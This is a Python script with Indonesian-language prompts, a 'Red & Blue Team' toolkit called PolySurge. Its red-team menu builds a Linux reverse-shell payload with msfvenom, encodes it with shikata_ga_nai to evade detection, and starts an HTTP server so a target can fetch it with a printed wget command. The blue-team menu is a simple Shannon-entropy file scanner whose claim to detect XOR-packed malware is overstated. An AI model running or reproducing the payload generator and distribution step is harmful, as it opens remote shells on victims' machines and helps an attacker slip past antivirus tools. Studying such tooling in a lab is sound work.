

import os
import sys
import math
import subprocess

# --- KONFIGURASI WARNA TERMINAL ---
class Warna:
    MERAH = '\033[91m'
    HIJAU = '\033[92m'
    KUNING = '\033[93m'
    BIRU = '\033[94m'
    RESET = '\033[0m'
    TEBAL = '\033[1m'

# --- MODUL BLUE TEAM (ENTROPY SCANNER) ---
def hitung_entropi(file_path):
    try:
        with open(file_path, "rb") as f:
            byte_arr = bytearray(f.read())
    except FileNotFoundError:
        print(f"{Warna.MERAH}[-] Error: File '{file_path}' tidak ditemukan!{Warna.RESET}")
        return None

    file_size = len(byte_arr)
    if file_size == 0:
        print(f"{Warna.MERAH}[-] Error: File kosong!{Warna.RESET}")
        return None

    freq_list = [0] * 256
    for byte in byte_arr:
        freq_list[byte] += 1

    entropy = 0.0
    for freq in freq_list:
        if freq > 0:
            prob = float(freq) / file_size
            entropy -= prob * math.log(prob, 2)

    return entropy

def analisis_file(file_path):
    print(f"\n{Warna.BIRU}[*] Memulai Heuristic Scan pada: {file_path}{Warna.RESET}")
    entropy = hitung_entropi(file_path)
    
    if entropy is not None:
        print(f"[*] Kalkulasi Shannon Entropy : {Warna.TEBAL}{entropy:.4f} / 8.0000{Warna.RESET}")
        
        if entropy > 7.2:
            print(f"{Warna.MERAH}[!] PERINGATAN KRITIS: Entropi sangat tinggi!{Warna.RESET}")
            print(f"{Warna.MERAH}    => Terindikasi Polymorphic/Packed Malware (Sandi XOR Terdeteksi).{Warna.RESET}")
            print(f"{Warna.MERAH}    => [MITIGASI] Rekomendasi Ruleset Suricata:{Warna.RESET}")
            print(f"{Warna.KUNING}       alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:\"PolySurge: High Entropy Anomaly\"; flow:established; sid:999999; rev:1;){Warna.RESET}")
        elif entropy > 6.0:
            print(f"{Warna.KUNING}[?] PERINGATAN: Entropi cukup tinggi.{Warna.RESET}")
            print(f"{Warna.KUNING}    => Kemungkinan file arsip terkompresi (.zip) atau executable padat.{Warna.RESET}")
        else:
            print(f"{Warna.HIJAU}[+] STATUS AMAN: Entropi rendah.{Warna.RESET}")
            print(f"{Warna.HIJAU}    => Struktur instruksi file dapat diprediksi (Benign File).{Warna.RESET}")
        print("-" * 65)

# --- MODUL RED TEAM (AUTOMATED MSFVENOM & SERVER) ---
def red_team_menu():
    print(f"\n{Warna.MERAH}{Warna.TEBAL}=== [ RED TEAM: EVASION PAYLOAD GENERATOR ] ==={Warna.RESET}")
    lhost = input(f"{Warna.KUNING}Masukkan LHOST (IP Kali Linux) : {Warna.RESET}")
    lport = input(f"{Warna.KUNING}Masukkan LPORT (Contoh: 4444)  : {Warna.RESET}")
    filename = input(f"{Warna.KUNING}Nama file output (misal: malware.elf): {Warna.RESET}")
    
    print(f"\n{Warna.BIRU}[*] Merakit Polymorphic Malware dengan Shikata Ga Nai (3 Iterasi)...{Warna.RESET}")
    
    cmd = f"msfvenom -p linux/x86/shell_reverse_tcp LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -i 3 -f elf -o {filename}"
    
    try:
        # Eksekusi msfvenom di latar belakang
        subprocess.run(cmd, shell=True, check=True)
        print(f"{Warna.HIJAU}[+] Berhasil! File '{filename}' telah dibuat dan dienkripsi.{Warna.RESET}")
        
        # Tanya pengguna apakah ingin membuka server distribusi
        start_srv = input(f"\n{Warna.BIRU}Apakah Anda ingin menyalakan Python HTTP Server untuk distribusi? (y/n): {Warna.RESET}")
        if start_srv.lower() == 'y':
            print(f"{Warna.KUNING}[*] Server aktif di port 8080. Target dapat mengunduh via 'wget http://{lhost}:8080/{filename}'{Warna.RESET}")
            print(f"{Warna.KUNING}[*] Tekan Ctrl+C untuk mematikan server.{Warna.RESET}")
            os.system("python3 -m http.server 8080")
            
    except subprocess.CalledProcessError:
        print(f"{Warna.MERAH}[-] Error: Pembuatan payload gagal. Pastikan Metasploit Framework terinstall.{Warna.RESET}")

# --- ANTARMUKA UTAMA (MAIN MENU) ---
def main_menu():
    os.system('clear')
    print(f"{Warna.BIRU}======================================================{Warna.RESET}")
    print(f"{Warna.TEBAL}{Warna.KUNING}  P O L Y - S U R G E   T O O L K I T  (v1.0){Warna.RESET}")
    print(f"{Warna.HIJAU}  Red & Blue Team Automated Framework{Warna.RESET}")
    print(f"{Warna.BIRU}======================================================{Warna.RESET}")
    print(f"{Warna.MERAH}  [ RED TEAM OPERATIONS ]{Warna.RESET}")
    print("  1. Generate Polymorphic Payload & Start Server")
    print(f"\n{Warna.HIJAU}  [ BLUE TEAM OPERATIONS ]{Warna.RESET}")
    print("  2. Heuristic Scan (Shannon Entropy Analisis)")
    print(f"\n{Warna.KUNING}  [99] Exit Toolkit{Warna.RESET}")
    print(f"{Warna.BIRU}======================================================{Warna.RESET}")
    
    pilihan = input("PolySurge > ")
    
    if pilihan == '1':
        red_team_menu()
    elif pilihan == '2':
        print(f"\n{Warna.HIJAU}{Warna.TEBAL}=== [ BLUE TEAM: HEURISTIC SCANNER ] ==={Warna.RESET}")
        target = input(f"{Warna.KUNING}Masukkan nama file target (misal: normal.txt) : {Warna.RESET}")
        analisis_file(target)
    elif pilihan == '99':
        print("Meninggalkan markas. Terima kasih, Jenderal!")
        sys.exit(0)
    else:
        print(f"{Warna.MERAH}[!] Opsi tidak valid.{Warna.RESET}")

if __name__ == "__main__":
    while True:
        try:
            main_menu()
            input(f"\n{Warna.BIRU}[Tekan Enter untuk kembali ke Menu Utama]{Warna.RESET}")
        except KeyboardInterrupt:
            print("\nTerdeteksi Ctrl+C. Mematikan PolySurge...")
            sys.exit(0)
